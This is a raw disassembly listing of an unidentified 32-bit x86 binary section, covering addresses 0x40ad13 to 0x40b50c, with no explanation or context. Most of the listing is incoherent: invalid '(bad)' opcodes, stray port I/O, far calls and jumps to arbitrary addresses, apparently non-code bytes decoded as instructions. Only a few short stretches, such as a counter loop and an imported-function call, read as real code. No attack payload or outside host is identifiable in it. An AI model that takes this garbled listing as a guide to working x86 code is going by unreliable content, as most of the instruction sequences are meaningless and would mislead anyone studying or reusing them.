  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi-0x6132f2ac],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad94
  40ad2c:	call   0xb82102dc
  40ad31:	mov    esi,0x7a438f8a
  40ad36:	mov    edx,0x6cdff1ac
  40ad3b:	int    0xf7
  40ad3d:	mov    dh,0xc2
  40ad3f:	popa   
  40ad40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad41:	es dec edi
  40ad43:	and    esp,ebx
  40ad45:	in     al,0x71
  40ad47:	lahf   
  40ad48:	jl     0x40acdd
  40ad4a:	aad    0xc8
  40ad4c:	inc    esi
  40ad4d:	fs cdq 
  40ad4f:	fistp  QWORD PTR [edx-0x7c85937c]
  40ad55:	fs stos DWORD PTR es:[edi],eax
  40ad57:	xor    al,0x8a
  40ad59:	mov    bl,0x10
  40ad5b:	mov    dl,0x98
  40ad5d:	or     bh,BYTE PTR [eax]
  40ad5f:	lock add ebp,DWORD PTR [edi+0x72f29510]
  40ad66:	mov    bh,0x7d
  40ad68:	or     al,0xba
  40ad6a:	shl    BYTE PTR [ebp+ebx*1-0x70],cl
  40ad6e:	mov    BYTE PTR [ebp*8+0x69af2747],ah
  40ad75:	clc    
  40ad76:	add    eax,ebp
  40ad78:	call   0x12f960d7
  40ad7d:	cs sbb al,0x5b
  40ad80:	xchg   DWORD PTR [edx+ebp*8-0x47b97f6a],ebp
  40ad87:	mov    al,ds:0x4a9cbfc6
  40ad8c:	jge    0x40ada9
  40ad8e:	popa   
  40ad8f:	loop   0x40adf3
  40ad91:	out    dx,al
  40ad92:	and    dl,al
  40ad94:	adc    ebp,DWORD PTR [ebx-0x7b]
  40ad97:	mov    al,ah
  40ad99:	test   eax,0xa98df037
  40ad9e:	aaa    
  40ad9f:	fmul   QWORD PTR [ebp+eiz*1-0x57]
  40ada3:	sbb    eax,0xf235e7f5
  40ada8:	test   eax,0xc87160d0
  40adad:	sub    DWORD PTR [edi+0xe7627ec],edi
  40adb3:	nop
  40adb4:	stc    
  40adb5:	out    dx,eax
  40adb6:	pop    ebx
  40adb7:	add    esi,edx
  40adb9:	dec    edx
  40adba:	adc    dl,BYTE PTR [eax]
  40adbc:	out    dx,eax
  40adbd:	(bad)  
  40adbe:	jnp    0x40ada3
  40adc0:	ss fcom st(3)
  40adc3:	ret    0x1dd5
  40adc6:	jge    0x40ad97
  40adc8:	cs jbe 0x40ad52
  40adcb:	pop    eax
  40adcc:	lods   eax,DWORD PTR ds:[esi]
  40adcd:	imul   ebx,DWORD PTR [eax+0x7619559],0x8fdf12c6
  40add7:	addr16 sub eax,0xd54355b8
  40addd:	pop    ebx
  40adde:	xchg   ebp,eax
  40addf:	cmp    esp,DWORD PTR [esi+0x74dde833]
  40ade5:	mov    esp,0x1af72e8a
  40adea:	test   al,0x72
  40adec:	lds    edi,FWORD PTR [eax]
  40adee:	daa    
  40adef:	call   0xef701e4
  40adf4:	(bad)  
  40adf5:	pushf  
  40adf6:	test   BYTE PTR [eax+0x21a73c01],cl
  40adfc:	sbb    eax,0x813b3763
  40ae01:	ret    0x4082
  40ae04:	repnz fnstsw WORD PTR [bx]
  40ae08:	push   0x31
  40ae0a:	add    eax,0xba9c6c5
  40ae0f:	inc    esp
  40ae10:	lds    edi,FWORD PTR ds:0x7236aaf8
  40ae16:	arpl   cx,dx
  40ae18:	shl    BYTE PTR [ebx+0x36fe2d2],cl
  40ae1e:	sar    DWORD PTR [edi+0x28],0x8c
  40ae22:	fdivr  QWORD PTR [edi+ebp*4-0x1c]
  40ae26:	iret   
  40ae27:	pop    esi
  40ae28:	(bad)  
  40ae29:	pushf  
  40ae2a:	push   esi
  40ae2b:	mov    ecx,0xdd038420
  40ae30:	inc    eax
  40ae31:	sub    eax,0x5927d8bd
  40ae36:	and    dh,BYTE PTR [edi+esi*2]
  40ae39:	sbb    ch,BYTE PTR [ebx-0x4f]
  40ae3c:	and    DWORD PTR [edi+0x1e0eb92],edx
  40ae42:	lods   eax,DWORD PTR ds:[esi]
  40ae43:	fbstp  TBYTE PTR [edx+0x219e5f84]
  40ae49:	cld    
  40ae4a:	retf   
  40ae4b:	fdivrp st(0),st
  40ae4d:	aaa    
  40ae4e:	push   0xffffffaa
  40ae50:	out    dx,eax
  40ae51:	loope  0x40ae7c
  40ae53:	inc    esp
  40ae54:	add    DWORD PTR [edx-0x26bb7dde],ecx
  40ae5a:	adc    dl,BYTE PTR [edi+0xd]
  40ae5d:	adc    esp,esp
  40ae5f:	jmp    0x41e84609
  40ae64:	pop    eax
  40ae65:	rol    al,1
  40ae67:	dec    ebx
  40ae68:	adc    eax,0x57f95a22
  40ae6d:	dec    ecx
  40ae6e:	aas    
  40ae6f:	(bad)  [ecx-0x5f]
  40ae72:	lahf   
  40ae73:	mov    ds:0x319e9ceb,eax
  40ae78:	test   esi,ecx
  40ae7a:	mov    al,ds:0x7c59700d
  40ae7f:	cli    
  40ae80:	pop    ds
  40ae81:	pop    eax
  40ae82:	cmp    cl,bl
  40ae84:	cdq    
  40ae85:	call   0x4062:0xe0ffc21b
  40ae8c:	mov    ds:0x185f6e38,eax
  40ae91:	fwait
  40ae92:	cmp    eax,DWORD PTR [ebx]
  40ae94:	ins    BYTE PTR es:[edi],dx
  40ae95:	mov    WORD PTR [edx],cs
  40ae97:	outs   dx,DWORD PTR ds:[esi]
  40ae98:	mov    al,0xff
  40ae9a:	or     eax,0x382ffaf8
  40ae9f:	mov    esi,0x5ad9732b
  40aea4:	outs   dx,BYTE PTR ds:[esi]
  40aea5:	sub    DWORD PTR [edi],ebp
  40aea7:	fwait
  40aea8:	adc    al,0xdd
  40aeaa:	xchg   ebp,eax
  40aeab:	cmp    eax,0x693b32d9
  40aeb0:	and    eax,0xd52b4976
  40aeb5:	pop    esp
  40aeb6:	cli    
  40aeb7:	cwde   
  40aeb8:	add    eax,0xaea0af42
  40aebd:	lahf   
  40aebe:	jb     0x40ae93
  40aec0:	mov    ds:0x2546a454,al
  40aec5:	outs   dx,DWORD PTR ds:[esi]
  40aec6:	or     esp,edi
  40aec8:	mov    dl,0xe7
  40aeca:	cmp    ecx,eax
  40aecc:	mov    esi,0xdefd0d31
  40aed1:	hlt    
  40aed2:	push   0x92d7e2c
  40aed7:	cmp    DWORD PTR [ecx],eax
  40aed9:	mov    al,0xbf
  40aedb:	push   ecx
  40aedc:	mov    ebp,0xefa53cbe
  40aee1:	jae    0x40af50
  40aee3:	cmp    bh,ah
  40aee5:	div    DWORD PTR [edx+0x57]
  40aee8:	inc    esp
  40aee9:	fld    DWORD PTR [eax+0x61]
  40aeec:	cmp    ecx,ecx
  40aeee:	mov    ecx,0xa7924787
  40aef3:	sti    
  40aef4:	jo     0x40af4d
  40aef6:	mov    bl,0x85
  40aef8:	xor    ch,BYTE PTR [ebx+0x58]
  40aefb:	xor    BYTE PTR [ebx-0x7e7825b3],dl
  40af01:	dec    esp
  40af02:	sub    DWORD PTR [eax-0x351be635],0xffffff9e
  40af09:	mov    esi,0x1abdafea
  40af0e:	(bad)  
  40af0f:	xchg   BYTE PTR [edx-0x21eb5325],ch
  40af15:	mov    al,0x96
  40af17:	xchg   dh,al
  40af19:	inc    edx
  40af1a:	int    0xc2
  40af1c:	fimul  DWORD PTR [eax]
  40af1e:	jg     0x40af4e
  40af20:	icebp  
  40af21:	pop    ebx
  40af22:	test   al,0xbf
  40af24:	imul   edx,esp,0x1e
  40af27:	mov    ebx,0x1d625f2e
  40af2c:	pop    es
  40af2d:	xchg   ebp,eax
  40af2e:	mov    ah,0x18
  40af30:	mov    ds:0x67856afb,al
  40af35:	sub    DWORD PTR [ebx-0x533e822b],ecx
  40af3b:	sbb    eax,0x890dcf5f
  40af40:	sub    DWORD PTR [edi],esi
  40af42:	jns    0x40af28
  40af44:	scas   al,BYTE PTR es:[edi]
  40af45:	lods   eax,DWORD PTR ds:[esi]
  40af46:	or     eax,0x801c48c7
  40af4b:	ds mov edx,0x892a7814
  40af51:	adc    DWORD PTR [ecx-0x52],ecx
  40af54:	or     dh,cl
  40af56:	sbb    esi,ebx
  40af58:	popa   
  40af59:	xchg   ecx,eax
  40af5a:	mov    ecx,0xbe092d63
  40af5f:	or     al,0xc2
  40af61:	add    BYTE PTR [ecx+0x5fd29363],dh
  40af67:	or     DWORD PTR [edi],0x13
  40af6a:	dec    eax
  40af6b:	jp     0x40af80
  40af6d:	jecxz  0x40afe8
  40af6f:	imul   ecx,DWORD PTR [edi-0x7ee7bf75],0xffffffc9
  40af76:	sbb    BYTE PTR [eax+0x0],dh
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x433727
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x4336df
  40af93:	sub    DWORD PTR ds:0x43368f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x4336db,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x4336db
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x4336db,ecx
  40afb8:	cmp    DWORD PTR ds:0x4336db,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x4336db,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x4336db,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x4336db
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x4336db,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x433727,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	mov    ebp,0x641b3809
  40b01c:	idiv   DWORD PTR [esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	sub    eax,ebx
  40b025:	imul   esi,DWORD PTR [esi+eiz*1],0xe1ccac11
  40b02c:	mov    ds:0xd9813bb,al
  40b031:	pop    ebx
  40b032:	in     al,dx
  40b033:	stos   BYTE PTR es:[edi],al
  40b034:	enter  0x902d,0x70
  40b038:	pop    es
  40b039:	or     cl,dh
  40b03b:	outs   dx,BYTE PTR ds:[esi]
  40b03c:	xchg   DWORD PTR [ecx+0x10],edx
  40b03f:	rol    DWORD PTR [ebx],cl
  40b041:	ror    al,cl
  40b043:	repnz push ebp
  40b045:	xchg   dh,ah
  40b047:	jmp    0xc72340a
  40b04c:	sbb    eax,0x6be2bbf5
  40b051:	cdq    
  40b052:	pushf  
  40b053:	xchg   esi,eax
  40b054:	push   cs
  40b055:	xchg   DWORD PTR [esi+0x13],ebp
  40b058:	div    BYTE PTR [ebx]
  40b05a:	repnz lods al,BYTE PTR ds:[esi]
  40b05c:	cmp    BYTE PTR [edi-0x57],0xdb
  40b060:	je     0x40b047
  40b062:	push   ebp
  40b063:	or     eax,0xaa861f46
  40b068:	sub    BYTE PTR [edx-0x70],dh
  40b06b:	dec    eax
  40b06c:	inc    ebx
  40b06d:	or     al,0x9c
  40b06f:	cmp    BYTE PTR [ebx-0xf1de73f],ch
  40b075:	sub    al,dh
  40b077:	jno    0x40b0cd
  40b079:	fwait
  40b07a:	(bad)  
  40b07b:	mov    ah,0xa6
  40b07d:	repz dec ecx
  40b07f:	lahf   
  40b080:	xor    al,0x17
  40b082:	dec    ebp
  40b083:	fld    st(7)
  40b085:	cmp    esi,esp
  40b087:	sub    bl,dh
  40b089:	cmc    
  40b08a:	mov    ebp,0x838b3845
  40b08f:	dec    ebp
  40b090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b091:	mov    bh,0xec
  40b093:	gs inc edi
  40b095:	sahf   
  40b096:	add    al,0x5f
  40b098:	mov    cl,dl
  40b09a:	mov    dl,0x62
  40b09c:	push   edx
  40b09d:	inc    ebp
  40b09e:	test   al,0x2
  40b0a0:	inc    ecx
  40b0a1:	shl    BYTE PTR [edi],cl
  40b0a3:	push   esi
  40b0a4:	and    eax,0xd5112d6
  40b0a9:	loopne 0x40b10b
  40b0ab:	mov    esi,0xa8609277
  40b0b0:	inc    eax
  40b0b1:	out    0x7b,al
  40b0b3:	push   ss
  40b0b4:	xchg   edi,eax
  40b0b5:	jo     0x40b090
  40b0b7:	push   ebx
  40b0b8:	xchg   esp,eax
  40b0b9:	sub    DWORD PTR [ecx+0x3374b9d6],eax
  40b0bf:	pushf  
  40b0c0:	or     ch,BYTE PTR [esi+0xb]
  40b0c3:	mov    eax,ds:0xd4190494
  40b0c8:	ret    0x583a
  40b0cb:	lods   eax,DWORD PTR ds:[esi]
  40b0cc:	or     bl,0xb4
  40b0cf:	pop    ebp
  40b0d0:	mul    BYTE PTR [eax-0x3ccd9494]
  40b0d6:	pop    edx
  40b0d7:	cmpxchg ebp,esi
  40b0da:	jnp    0x40b119
  40b0dc:	aad    0x37
  40b0de:	dec    eax
  40b0df:	push   esp
  40b0e0:	mov    eax,ds:0xd2f71d83
  40b0e5:	dec    esp
  40b0e6:	gs popf 
  40b0e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0e9:	or     eax,0x56c149a7
  40b0ee:	ja     0x40b0ee
  40b0f0:	and    BYTE PTR [eax+0x2ceb7533],bl
  40b0f6:	mov    cs,WORD PTR [esi-0x1]
  40b0f9:	push   esp
  40b0fa:	mov    dl,0xeb
  40b0fc:	out    dx,al
  40b0fd:	(bad)  
  40b0fe:	mov    DWORD PTR [eax+ecx*4+0x3f],0xe72ea351
  40b106:	adc    al,0x11
  40b108:	and    BYTE PTR [ebp+eax*2-0x27],ah
  40b10c:	ficomp DWORD PTR [eax+ebx*8-0xf]
  40b110:	div    BYTE PTR [eax]
  40b112:	adc    eax,0xac97025
  40b117:	push   ebp
  40b118:	pop    ss
  40b119:	data16 data16 mov bl,0xcb
  40b11d:	aad    0x59
  40b11f:	sub    al,0x39
  40b121:	les    ebx,FWORD PTR [esi+0x5be8853e]
  40b127:	fadd   DWORD PTR [ebx-0x73]
  40b12a:	cmp    BYTE PTR [ebx],ah
  40b12c:	adc    eax,0x1d108dc8
  40b131:	pop    es
  40b132:	adc    edi,DWORD PTR [ebp-0x5b]
  40b135:	sbb    DWORD PTR [ebx-0x22],0x4cd3de8e
  40b13c:	gs popf 
  40b13e:	bound  edx,QWORD PTR [edx-0x1bc2dfd9]
  40b144:	sbb    ah,BYTE PTR [ecx+0x4262dae7]
  40b14a:	add    eax,0x6ee5fc1b
  40b14f:	(bad)  
  40b150:	xor    al,BYTE PTR [eax+0x21901326]
  40b156:	mov    bl,0x1b
  40b158:	cmp    bh,0x13
  40b15b:	pop    ebx
  40b15c:	stc    
  40b15d:	cmp    eax,0x71d6f6de
  40b162:	xchg   ebp,eax
  40b163:	mov    al,0xe9
  40b165:	not    eax
  40b167:	push   ecx
  40b168:	(bad)  
  40b169:	xor    eax,0xca006db9
  40b16e:	xor    DWORD PTR [edi+0x7b23f930],esp
  40b174:	lods   eax,DWORD PTR ds:[esi]
  40b175:	inc    ebp
  40b176:	lods   eax,DWORD PTR ds:[esi]
  40b177:	ret    
  40b178:	clc    
  40b179:	jne    0x40b1c4
  40b17b:	or     edi,eax
  40b17d:	out    0xac,al
  40b17f:	retf   
  40b180:	fld    QWORD PTR [edi+0x69319757]
  40b186:	push   0x3b
  40b188:	mov    cl,0x11
  40b18a:	jae    0x40b1f4
  40b18c:	in     eax,0x82
  40b18e:	out    dx,eax
  40b18f:	jb     0x40b1b5
  40b191:	mov    cl,0x3d
  40b193:	push   0x2b
  40b195:	dec    edx
  40b196:	sub    cl,BYTE PTR [ecx+0x3604849d]
  40b19c:	sbb    eax,0xce4dbc28
  40b1a1:	retf   
  40b1a2:	shl    DWORD PTR [ebx],0xee
  40b1a5:	or     bl,BYTE PTR [ebx-0x3c924d2e]
  40b1ab:	jnp    0x40b161
  40b1ad:	sbb    eax,0xf31b6c9d
  40b1b2:	sbb    al,0x35
  40b1b4:	add    esp,DWORD PTR [edx+0x19]
  40b1b7:	cmp    eax,0x8bb4976d
  40b1bc:	jnp    0x40b1cd
  40b1be:	jl     0x40b160
  40b1c0:	sub    DWORD PTR [edx+edi*2-0xf],ebx
  40b1c4:	lea    edi,[ecx-0x68]
  40b1c7:	(bad)
  40b1cc:	nop
  40b1cd:	mov    bl,dl
  40b1cf:	lods   al,BYTE PTR ds:[esi]
  40b1d0:	in     eax,dx
  40b1d1:	xor    BYTE PTR [edx+0x76],bl
  40b1d4:	fdiv   QWORD PTR [edi]
  40b1d6:	mov    al,BYTE PTR [eax]
  40b1d8:	(bad)  
  40b1d9:	out    dx,eax
  40b1da:	test   DWORD PTR [ebp-0x70],esi
  40b1dd:	xor    DWORD PTR [ebx-0x72],edx
  40b1e0:	dec    esi
  40b1e1:	inc    esp
  40b1e2:	ins    BYTE PTR es:[edi],dx
  40b1e3:	mov    edi,DWORD PTR [edi]
  40b1e5:	bound  esi,QWORD PTR [edx-0x7f]
  40b1e8:	mov    dh,BYTE PTR [ebx]
  40b1ea:	jo     0x40b226
  40b1ec:	and    eax,0x3301785b
  40b1f1:	push   eax
  40b1f2:	(bad)  
  40b1f3:	sahf   
  40b1f4:	retf   
  40b1f5:	xchg   DWORD PTR [esi],esi
  40b1f7:	add    dh,BYTE PTR [ecx+0x13]
  40b1fa:	jmp    0x4508:0xc182f819
  40b201:	pop    edi
  40b202:	cmp    eax,0xf069a223
  40b207:	inc    ecx
  40b208:	out    dx,eax
  40b209:	loop   0x40b204
  40b20b:	imul   esp,DWORD PTR [ecx],0xffffff9f
  40b20e:	ret    
  40b20f:	inc    edx
  40b210:	sbb    DWORD PTR [ebx],eax
  40b212:	adc    esi,0x35
  40b215:	and    al,0xad
  40b217:	aam    0xf6
  40b219:	mov    eax,0x6a4e83cc
  40b21e:	xor    ebx,DWORD PTR [ebx]
  40b220:	push   0x229a44de
  40b225:	dec    esp
  40b226:	ins    BYTE PTR es:[edi],dx
  40b227:	xor    ebx,DWORD PTR [edi+0x2ced05e1]
  40b22d:	in     al,0xb7
  40b22f:	jge    0x40b243
  40b231:	je     0x40b244
  40b233:	jns    0x40b1d7
  40b235:	jns    0x40b1ed
  40b237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b238:	in     eax,0xa5
  40b23a:	and    BYTE PTR [esi+0x4612f31e],ch
  40b240:	pop    ebp
  40b241:	adc    bl,BYTE PTR [esp+edi*2-0x553c5ab1]
  40b248:	ds retf 
  40b24a:	popa   
  40b24b:	xchg   esi,eax
  40b24c:	adc    ebp,ebx
  40b24e:	loopne 0x40b243
  40b250:	sub    eax,0x9c952d29
  40b255:	pusha  
  40b256:	stos   DWORD PTR es:[edi],eax
  40b257:	mov    cl,0x80
  40b259:	jmp    0x3b91ccf9
  40b25e:	bound  ebp,QWORD PTR cs:[esi+eiz*2+0x6d387cbb]
  40b266:	jo     0x40b2a1
  40b268:	ror    DWORD PTR [ebx+0x4d8bec45],1
  40b26e:	or     BYTE PTR [ebx],al
  40b270:	dec    eax
  40b271:	and    al,0xe9
  40b273:	pop    esi
  40b274:	add    al,BYTE PTR [eax]
  40b276:	add    BYTE PTR [ecx-0x73],dh
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	and    ebp,edi
  40b285:	bound  edx,QWORD PTR [esi+ebp*1-0xe]
  40b289:	jle    0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	(bad)  
  40b290:	test   DWORD PTR [ebx-0x9],0x419a4389
  40b297:	jp     0x40b2d6
  40b299:	dec    edx
  40b29a:	cmp    al,0x3
  40b29c:	mov    ds:0x8d0c533c,eax
  40b2a1:	hlt    
  40b2a2:	daa    
  40b2a3:	data16 jp 0x40b2ad
  40b2a6:	sahf   
  40b2a7:	mov    dl,0x74
  40b2a9:	or     BYTE PTR [ecx],ah
  40b2ab:	mov    ch,0x71
  40b2ad:	add    cx,WORD PTR [edx]
  40b2b0:	pop    ss
  40b2b1:	inc    eax
  40b2b2:	jo     0x40b253
  40b2b4:	mov    al,0x3d
  40b2b6:	mov    dh,0xc7
  40b2b8:	adc    eax,0xfecba8ba
  40b2bd:	mov    ds:0xddf3c2d6,al
  40b2c2:	sbb    eax,0x32a64b64
  40b2c7:	jg     0x40b25d
  40b2c9:	lea    ebx,[esi+0x4534c74]
  40b2cf:	adc    al,0x42
  40b2d1:	pusha  
  40b2d2:	or     esp,DWORD PTR [ebp-0x1d517fb0]
  40b2d8:	mov    esp,0xabe0028a
  40b2dd:	mov    al,0xf7
  40b2df:	fsubr  QWORD PTR [ebp-0x815b54a]
  40b2e5:	sub    dl,bl
  40b2e7:	fist   DWORD PTR [edx-0x7f]
  40b2ea:	dec    esp
  40b2eb:	mov    al,ds:0xda810d07
  40b2f0:	lods   eax,DWORD PTR ds:[esi]
  40b2f1:	inc    edx
  40b2f2:	cmp    ecx,esp
  40b2f4:	pop    edx
  40b2f5:	jo     0x40b351
  40b2f7:	mov    ch,BYTE PTR [ecx-0x20]
  40b2fa:	mov    ds:0x2270f38b,al
  40b2ff:	adc    dl,BYTE PTR [edi+0x30]
  40b302:	push   edi
  40b303:	mov    edx,0x79dc4fa
  40b308:	int3   
  40b309:	add    ah,0x7
  40b30c:	fdiv   DWORD PTR [ecx+0x6a3cbf18]
  40b312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b313:	and    BYTE PTR [edx+0x7eda7592],bl
  40b319:	and    BYTE PTR [eax-0x742f600d],bl
  40b31f:	mov    cl,0x64
  40b321:	xor    DWORD PTR [edi+eax*2-0x4aebb6b],0x629d6aa9
  40b32c:	(bad)  
  40b32d:	test   BYTE PTR [ecx+0x53],0x98
  40b331:	sar    al,0x72
  40b334:	mov    ds:0x904a87e3,al
  40b339:	sbb    al,0xaf
  40b33b:	repz push ds
  40b33d:	icebp  
  40b33e:	pop    eax
  40b33f:	lock shr BYTE PTR [ebp-0x5],cl
  40b343:	repnz mov bh,0xb0
  40b347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b348:	aam    0x18
  40b34a:	std    
  40b34b:	jl     0x40b332
  40b34d:	fisttp DWORD PTR [edx+0x3a1e5943]
  40b353:	shr    bl,1
  40b355:	jle    0x40b2dd
  40b357:	addr16 popa 
  40b359:	xchg   edx,eax
  40b35a:	jo     0x40b30d
  40b35c:	scas   al,BYTE PTR es:[edi]
  40b35d:	push   esi
  40b35e:	inc    esi
  40b35f:	push   ebp
  40b360:	jle    0x40b3c3
  40b362:	adc    cl,BYTE PTR [edi-0x5]
  40b365:	push   edi
  40b366:	aas    
  40b367:	jge    0x40b3cd
  40b369:	shl    bh,1
  40b36b:	jg     0x40b3e5
  40b36d:	add    eax,0xe6651fdc
  40b372:	or     ebp,DWORD PTR [ecx+ebp*2+0x3a]
  40b376:	call   0x1234:0xba8526f0
  40b37d:	repnz pop edx
  40b37f:	shl    DWORD PTR [edi],cl
  40b381:	fcom   DWORD PTR [ebx+edx*4-0x29a65002]
  40b388:	fisubr WORD PTR [ecx-0x4747a003]
  40b38e:	sub    dh,ch
  40b390:	fcmovb st,st(3)
  40b392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b393:	shr    BYTE PTR [esi+0x7f0a01],0xea
  40b39a:	call   0x23ef2847
  40b39f:	jmp    0x781c483f
  40b3a4:	daa    
  40b3a5:	iret   
  40b3a6:	xor    BYTE PTR [edi],ch
  40b3a8:	ins    DWORD PTR es:[edi],dx
  40b3a9:	xor    BYTE PTR [esi-0x38],ch
  40b3ac:	add    DWORD PTR [ebp+0x36f6a3c1],eax
  40b3b2:	cmp    dh,al
  40b3b4:	lea    esp,[edx+esi*1+0x63e82753]
  40b3bb:	shl    DWORD PTR [ebx-0x63],0x46
  40b3bf:	aad    0xdc
  40b3c1:	(bad)  
  40b3c2:	out    dx,eax
  40b3c3:	lock imul ebp,DWORD PTR [ebx-0x70fbbc99],0xe82b3121
  40b3ce:	mov    ah,0xb1
  40b3d0:	test   DWORD PTR [ecx],esp
  40b3d2:	fisub  DWORD PTR [ecx+0x5f]
  40b3d5:	idiv   DWORD PTR [esi+0x60]
  40b3d8:	repnz (bad) 
  40b3da:	sbb    cl,BYTE PTR [edx+0x3560decc]
  40b3e0:	daa    
  40b3e1:	or     DWORD PTR [edi],edi
  40b3e3:	adc    DWORD PTR [esi+0x40],ecx
  40b3e6:	inc    ecx
  40b3e7:	pop    ebx
  40b3e8:	jns    0x40b44d
  40b3ea:	sub    dl,cl
  40b3ec:	sub    eax,0x4d1d6314
  40b3f1:	cmp    DWORD PTR [edi],ebp
  40b3f3:	retf   0x366a
  40b3f6:	pop    si
  40b3f8:	enter  0x5797,0x8c
  40b3fc:	and    DWORD PTR [ebx+0xd],esi
  40b3ff:	pop    ds
  40b400:	aaa    
  40b401:	fmul   DWORD PTR [ecx+ebp*8+0x4a]
  40b405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b406:	loopne 0x40b3c8
  40b408:	sub    ebp,DWORD PTR [ebx]
  40b40a:	aad    0x58
  40b40c:	jp     0x40b3c0
  40b40e:	cli    
  40b40f:	test   DWORD PTR [ebx],0xde070582
  40b415:	inc    esp
  40b416:	dec    edx
  40b417:	mov    bh,0x1f
  40b419:	fistp  WORD PTR [esp+ebx*4]
  40b41c:	push   ds
  40b41d:	push   ebx
  40b41e:	and    al,0x43
  40b420:	outs   dx,DWORD PTR ds:[esi]
  40b421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b422:	das    
  40b423:	mov    ah,0x8b
  40b425:	or     eax,0x1e3a7bc3
  40b42a:	push   esi
  40b42b:	stc    
  40b42c:	jmp    0xeb2c74bf
  40b431:	es pop esi
  40b433:	hlt    
  40b434:	mov    ebp,0x72fa0112
  40b439:	sbb    al,0x8f
  40b43b:	push   eax
  40b43c:	std    
  40b43d:	repz shl DWORD PTR [bx+di],cl
  40b441:	jl     0x40b455
  40b443:	(bad)  
  40b444:	clc    
  40b445:	sub    eax,0xf6e9ef9e
  40b44a:	les    edi,FWORD PTR [ebp+esi*4+0x29f42ed8]
  40b451:	rcr    DWORD PTR [ebp+0x2f],0x80
  40b455:	mov    ebx,DWORD PTR [edi+ebp*8-0x22]
  40b459:	sub    ah,BYTE PTR [ebx+0x67555881]
  40b45f:	sar    DWORD PTR [ecx-0x2dbfc997],0x65
  40b466:	loope  0x40b440
  40b468:	hlt    
  40b469:	mov    bh,0x51
  40b46b:	xchg   edx,eax
  40b46c:	pop    edi
  40b46d:	sub    al,0x3e
  40b46f:	dec    ecx
  40b471:	outs   dx,BYTE PTR ds:[esi]
  40b472:	xor    ebp,DWORD PTR [edx]
  40b474:	dec    esi
  40b475:	je     0x40b402
  40b477:	ret    
  40b478:	add    dl,BYTE PTR [ebx+0x3e]
  40b47b:	push   ebp
  40b47c:	pop    esi
  40b47d:	mov    al,0x9d
  40b47f:	pop    ebp
  40b480:	cmp    ebp,edi
  40b482:	mov    al,ds:0x8f6c2aaf
  40b487:	sub    DWORD PTR [edx-0x52d0c47a],ebx
  40b48d:	mov    dl,0x82
  40b48f:	mov    bl,0x1b
  40b491:	xor    eax,0x2200489e
  40b496:	imul   eax,DWORD PTR [ebx],0xffffff86
  40b499:	aad    0x7e
  40b49b:	lahf   
  40b49c:	push   eax
  40b49d:	cmp    ecx,DWORD PTR [ecx]
  40b49f:	cld    
  40b4a0:	call   0x8ba0:0xbb17b134
  40b4a7:	push   0xffffffb2
  40b4a9:	jb     0x40b503
  40b4ab:	jg     0x40b470
  40b4ad:	inc    DWORD PTR [eax+0x3c]
  40b4b0:	dec    esi
  40b4b1:	inc    ebp
  40b4b2:	push   ss
  40b4b3:	adc    eax,0x17e82af0
  40b4b8:	adc    al,0x4b
  40b4ba:	shl    BYTE PTR [ebp+eax*4-0x7a41b997],cl
  40b4c1:	or     DWORD PTR [ebx+0x69],ecx
  40b4c4:	cmp    eax,0xa3be427
  40b4c9:	jge    0x1d7c270d
  40b4cf:	sub    DWORD PTR [edi-0x2],esp
  40b4d2:	out    0xb2,eax
  40b4d4:	loopne 0x40b45f
  40b4d6:	dec    ebp
  40b4d7:	aam    0x8b
  40b4d9:	inc    ebp
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	push   0xe8ec3e4b
  40b50c:	lock jle 0x40b58d
